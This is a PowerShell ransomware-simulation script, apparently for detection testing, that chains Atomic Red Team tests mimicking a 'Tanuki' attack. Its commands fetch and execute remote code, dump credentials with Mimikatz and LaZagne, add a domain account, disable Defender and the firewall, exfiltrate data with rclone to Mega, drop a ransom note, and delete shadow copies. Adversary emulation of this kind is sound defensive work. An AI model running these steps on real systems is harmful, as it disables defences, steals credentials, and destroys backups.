# Tanuki Ransomware Simulation Script
# Author : Joakim Wahlgren (@jw4n6)
# Date: 2024-09-17
# Tested with PowerShell 7

Set-ExecutionPolicy Bypass -Force

# This function is adapted from https://github.com/skandler/simulate-akira
# Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
function Test-Administrator
{
    [OutputType([bool])]
    param()
    process {
        [Security.Principal.WindowsPrincipal]$user = [Security.Principal.WindowsIdentity]::GetCurrent();
        return $user.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator);
    }
}

if(-not (Test-Administrator))
{
    Write-Error "This script must be executed as Administrator.";
    exit 1;
}

# This function is adapted from https://github.com/skandler/simulate-akira
# Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
$Logfile = $MyInvocation.MyCommand.Path -replace '\.ps1$', '.log'
Start-Transcript -Path $Logfile

# Create the required directories for Atomic Red Team and external payloads
echo "Creating required directories C:\AtomicRedTeam\ExternalPayloads"
New-Item -Type Directory "C:\AtomicRedTeam\ExternalPayloads" -ErrorAction Ignore -Force | Out-Null

# T1564.012 - File/Path Exclusions (Windows Defender) - Add AtomicRedTeam directory to Windows Defender exclusions
echo "Add AtomicRedTeam directory to Windows Defender exclusions"
Add-MpPreference -ExclusionPath "C:\AtomicRedTeam"

# Install and enable Atomic Red Team
echo "Installing Atomic Red Team"
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);Install-AtomicRedTeam -getAtomics -Force
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force

echo "Start Tanuki ransomware simulation"

# Atomic Test #1 - T1033 - System Owner/User Discovery
echo "T1033 - System Owner/User Discovery"
Invoke-AtomicTest T1033 -TestNumbers 1

# This function is adapted from https://github.com/skandler/simulate-akira
# Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
# Atomic Test #2 - T1069.001 - Basic Permission Groups Discovery Windows (Local)
echo "T1069.001 - Basic Permission Groups Discovery Windows (Local)"
Invoke-AtomicTest T1069.001 -TestNumbers 2

# This function is adapted from https://github.com/skandler/simulate-akira
# Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
# Atomic Test #3 - T1069.002 - Basic Permission Groups Discovery Windows (Domain)
echo "T1069.002 - Basic Permission Groups Discovery Windows (Domain)"
Invoke-AtomicTest T1069.002 -TestNumbers 1

# This function is adapted from https://github.com/skandler/simulate-akira
# Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
# Atomic Test #4 T1046 - Network Service Discovery (advanced ip scanner)
echo "T1046 - Network Service Discovery (advanced ip scanner)"
Invoke-WebRequest -Uri "https://download.advanced-ip-scanner.com/download/files/Advanced_IP_Scanner_2.5.4594.1.exe" -OutFile "C:\AtomicRedTeam\ExternalPayloads\Advanced_IP_Scanner_2.5.4594.1.exe"
C:\AtomicRedTeam\ExternalPayloads\Advanced_IP_Scanner_2.5.4594.1.exe /SP- /VERYSILENT
cmd.exe /c "C:\Program Files (x86)\Advanced IP Scanner\advanced_ip_scanner_console.exe" "/r:10.10.10.1-10.10.10.255"

# Atomic Test #5 T1135 -  Network Share Discovery (SharpShares)
echo "T1135 - Network Share Discovery (SharpShares)"
Invoke-WebRequest "https://github.com/mitchmoser/SharpShares/releases/download/v2.4/SharpShares.exe" -OutFile "C:\AtomicRedTeam\ExternalPayloads\SharpShares.exe"
Invoke-AtomicTest T1135 -TestNumbers 11

# This function is adapted from https://github.com/skandler/simulate-black-basta
# Original file: https://github.com/skandler/simulate-black-basta/blob/main/Blackbasta_Ransomware_Atomic_Simulation.ps1
#Atomic Test #6 T1021.001. Remote Services: Remote Desktop Protocol
echo "T1021.001. Remote Services: Remote Desktop Protocol"
Invoke-AtomicTest T1021.001 -TestNumbers 1

# This function is adapted from https://github.com/skandler/simulate-black-basta
# Original file: https://github.com/skandler/simulate-black-basta/blob/main/Blackbasta_Ransomware_Atomic_Simulation.ps1
#Atomic Test #7 - T1003.001 - OS Credential Dumping: LSASS Memory - with Mimikatz
echo "T1003.001 - OS Credential Dumping: LSASS Memory - with Mimikatz"
Invoke-AtomicTest T1003.001 -TestNumbers 5
Invoke-AtomicTest T1003.001 -TestNumbers 6 -GetPrereqs
Invoke-AtomicTest T1003.001 -TestNumbers 6 -CheckPrereqs
Invoke-AtomicTest T1003.001 -TestNumbers 6

# This function is adapted from https://github.com/skandler/simulate-akira
# Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
# Atomic Test 8 - T1555.003 - Dump Credentials using Lazagne
echo "T1555.003 - Dump Credentials using Lazagne"
Invoke-AtomicTest T1555.003 -TestNumber 3 -GetPrereqs
Invoke-AtomicTest T1555.003 -TestNumber 3

# This function is adapted from https://github.com/skandler/simulate-akira
# Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
# Atomic Test #9 T1136.002 - Create Account: Domain Account - Username tanuki
echo "T1136.002 - Create Account: Domain Account - Username tanuki"
net user tanuki "pw@1234!" /add /domain
Invoke-AtomicTest T1136.002 -TestNumbers 1

# This function is adapted from https://github.com/skandler/simulate-akira
# Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
# Atomic Test #10 - T1053.005 - Scheduled Task Startup Script
echo "T1053.005 - Scheduled Task Startup Script"
Invoke-AtomicTest T1053.005 -TestNumbers 1

# This function is adapted from https://github.com/skandler/simulate-black-basta
# Original file: https://github.com/skandler/simulate-black-basta/blob/main/Blackbasta_Ransomware_Atomic_Simulation.ps1
#Atomic Test #11 - T1569.002 - System Services: Service Execution Atomic Test #2 - Use PsExec to execute a command on a remote host
echo "T1569.002 - System Services (psexec)"
Invoke-AtomicTest T1569.002 -TestNumbers 2 -GetPrereqs
Invoke-AtomicTest T1569.002 -TestNumbers 2

# This function is adapted from https://github.com/skandler/simulate-black-basta
# Original file: https://github.com/skandler/simulate-black-basta/blob/main/Blackbasta_Ransomware_Atomic_Simulation.ps1
# Atomic Test #12 T1559 Cobalt Strike usage
echo "T1559 Cobalt Strike usage"
Invoke-AtomicTest T1559 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1559 -TestNumbers 1
Invoke-AtomicTest T1559 -TestNumbers 2
Invoke-AtomicTest T1559 -TestNumbers 3
Invoke-AtomicTest T1559 -TestNumbers 4

# This function is adapted from https://github.com/skandler/simulate-akira
# Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
# Atomic Test #13 T1562.001 - Impair Defenses: Disable or Modify Tools - disable defender
echo "T1562.001 - Impair Defenses: Disable or Modify Tools - disable defender"
Invoke-AtomicTest T1562.001 -TestNumbers 16 #passt nicht ganz - defender Disable
Invoke-AtomicTest T1562.001 -TestNumbers 27 #disable defender with dism

# This function is adapted from https://github.com/skandler/simulate-akira
# Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
# Atomic Test #14 - T1562.004 - Disable Microsoft Defender Firewall via Registry
echo "T1562.004 - Disable Microsoft Defender Firewall via Registry"
Invoke-AtomicTest T1562.004 -TestNumbers 2

# This function is adapted from https://github.com/skandler/simulate-akira
# Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
# Atomic Test #15 - T1219 - Remote Access Software - AnyDesk Files Detected Test on Windows
echo "T1219 - Remote Access Software - AnyDesk Files Detected Test on Windows"
Invoke-AtomicTest T1219 -TestNumbers 2

# Atomic Test #16 T1074.001 - Data Staged: Local Data Staging
echo "T1074.001 - Data Staged: Local Data Staging"
Invoke-AtomicTest T1074.001 -TestNumbers 3

# This function is adapted from https://github.com/skandler/simulate-akira
# Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
# Atomic Test #17 - T1567.002 - Exfiltrate data with rclone to cloud Storage - Mega (Windows)
echo "T1567.002 - Exfiltrate data with rclone to cloud Storage - Mega (Windows)"
Invoke-AtomicTest T1567.002 -GetPrereqs
Invoke-AtomicTest T1567.002

# This function is adapted from https://github.com/skandler/simulate-akira
# Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
# Test #18 - T1486 - Add Files with .tanuki file extension + Tanuki ransomnote
echo "T1486 - Add 100 Files with .tanuki file extension and Tanuki ransomnote"
1..100 | ForEach-Object { $out = new-object byte[] 1073741; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes("c:\encrypted.$_.tanuki", $out) }
$users = Get-WmiObject Win32_UserProfile | Where-Object { $_.Special -eq $false -and $_.LocalPath -match 'Users' }
$uri = "https://raw.githubusercontent.com/jw4n6/tanuki/main/Tanuki_ReadMe.txt"

foreach ($user in $users) {
    $desktopPath = Join-Path $user.LocalPath "Desktop"
    if (Test-Path $desktopPath) {
        Invoke-WebRequest -Uri $uri -OutFile (Join-Path $desktopPath "Tanuki_ReadMe.txt")
    }
}

# Test 19 - T1491 - Replace desktop wallpaper with Tanuki wallpaper
echo "T1491 - Replace desktop wallpaper with Tanuki wallpaper"
$url = "https://raw.githubusercontent.com/jw4n6/tanuki/main/tanukiwallpaper.jpg"
$imgLocation = "$env:USERPROFILE\Pictures\tanukiwallpaper.jpg"
$orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\Control Panel\Desktop\' -Name WallPaper).WallPaper
$orgWallpaper | Out-File -FilePath "$env:USERPROFILE\Pictures\tanukiwallpaper.jpg"
$updateWallpapercode = @'
using System.Runtime.InteropServices;
namespace Win32{

    public class Wallpaper{
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;

         public static void SetWallpaper(string thePath){
            SystemParametersInfo(20,0,thePath,3);
        }
    }
}
'@
$wc = New-Object System.Net.WebClient
try{
    $wc.DownloadFile($url, $imgLocation)
    add-type $updateWallpapercode
    [Win32.Wallpaper]::SetWallpaper($imgLocation)
}
catch [System.Net.WebException]{
    Write-Host("Cannot download $url")
    add-type $updateWallpapercode
    [Win32.Wallpaper]::SetWallpaper($imgLocation)
}
finally{
    $wc.Dispose()
}

# This function is adapted from https://github.com/skandler/simulate-akira
# Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
# Atomic Test #20 - T1490 - Windows - Delete Volume Shadow Copies with Powershell
echo "T1490 - Windows - Delete Volume Shadow Copies with Powershell"
Invoke-AtomicTest T1490 -TestNumbers 5

# open ransomnote with notepad
echo "open ransomnote with notepad"
notepad.exe $env:USERPROFILE\Desktop\Tanuki_ReadMe.txt

echo "Finished Tanuki ransomware simulation script"
